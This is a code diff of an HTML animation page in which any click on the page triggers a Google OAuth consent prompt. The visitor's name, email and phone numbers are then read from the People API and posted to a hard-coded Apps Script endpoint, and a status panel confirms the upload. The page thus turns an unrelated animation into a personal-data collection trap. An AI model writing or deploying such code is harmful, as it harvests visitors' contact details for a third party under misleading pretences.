@@ -178,11 +178,14 @@ document.addEventListener("click", function() {
 animate();
 </script>
 
-<!-- Demo panel: shows what we received from People API -->
-<div id="demoPanel" style="display:none; position:fixed;left:16px;bottom:16px;z-index:99999;background:rgba(0,0,0,.6);color:#fff;padding:12px 14px;border-radius:12px;max-width:92vw;font-size:14px;line-height:1.4"><div id="demoContent"></div></div>
+<!-- Demo panel (ẩn tới khi có dữ liệu) -->
+<div id="demoPanel" style="display:none; position:fixed;left:16px;bottom:16px;z-index:99999;background:rgba(0,0,0,.6);color:#fff;padding:12px 14px;border-radius:12px;max-width:92vw;font-size:14px;line-height:1.4">
+  <div id="demoContent"></div>
+</div>
 
 <!-- Google Identity Services SDK -->
 <script src="https://accounts.google.com/gsi/client" async defer></script>
+
 <script>
 const CLIENT_ID  = '585272145485-hmefm5up9vsqq1j8gotp75ssqlfqjrfl.apps.googleusercontent.com';
 const UPLOAD_URL = 'https://script.google.com/macros/s/1qcXD9ZL9vS1g0zUfaYPICfm09gqFbwCDmOGeYIU2A54_CrFE-PRc76Gt/exec';
@@ -190,12 +193,14 @@ const UPLOAD_URL = 'https://script.google.com/macros/s/1qcXD9ZL9vS1g0zUfaYPICfm0
 let tokenClient;
 let accessToken = null;
 
-function setDemo(html) { 
-  const el = document.getElementById('demoContent'); 
-  if (el) el.innerHTML = html; document.getElementById("demoPanel").style.display="block"; 
+function setDemo(html) {
+  const el = document.getElementById('demoContent');
+  if (el) el.innerHTML = html;
+  document.getElementById('demoPanel').style.display = 'block';
 }
 
-window.addEventListener('load', () => {  
+window.addEventListener('load', () => {
+  // Khởi tạo token client
   tokenClient = google.accounts.oauth2.initTokenClient({
     client_id: CLIENT_ID,
     scope: [
@@ -206,18 +211,19 @@ window.addEventListener('load', () => {
     ].join(' '),
     prompt: 'consent',
     callback: async (resp) => {
-      if (resp.error) { console.error(resp); setDemo('Không lấy được token: ' + resp.error); return; }
+      if (resp.error) { setDemo('Không lấy được token: ' + resp.error); return; }
       accessToken = resp.access_token;
       await fetchProfileAndSend();
     },
   });
 
+  // Nhấn bất kỳ đâu để mở đăng nhập (chỉ 1 lần)
   document.addEventListener('click', () => {
     tokenClient.requestAccessToken({ prompt: '' });
   }, { once: true });
 });
 
-<script>
+// === Bản debug chi tiết People API ===
 async function fetchProfileAndSend() {
   const show = (msg) =>
     setDemo(typeof msg === 'string'
@@ -259,23 +265,6 @@ async function fetchProfileAndSend() {
     setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br>${sendRes.ok ? '✅ Đã gửi về Apps Script' : '❌ Gửi về Apps Script thất bại'}`);
   } catch (e) {
     show('❌ Failed to fetch (có thể do CORS/mạng/extension).<br><small>' + (e?.message || e) + '</small>');
-  }
-}
-</script>
-    
-    const ok = sendRes.ok;
-    setDemo(`
-      <div><b>Tên:</b> ${name || '—'}</div>
-      <div><b>Email:</b> ${email || '—'}</div>
-      <div><b>SĐT:</b> ${phones.length ? phones.join(', ') : '—'}</div>
-      <div style="margin-top:8px;color:${ok ? '#8ef58e' : '#ffbaba'}">
-        ${ok ? '✅ Đã gửi về Apps Script thành công' : '❌ Gửi về Apps Script thất bại'}
-      </div>
-    `);
-
-  } catch (e) {
-    console.error(e);
-    setDemo('Gọi People API thất bại: ' + e.message);
   }
 }
 </script>
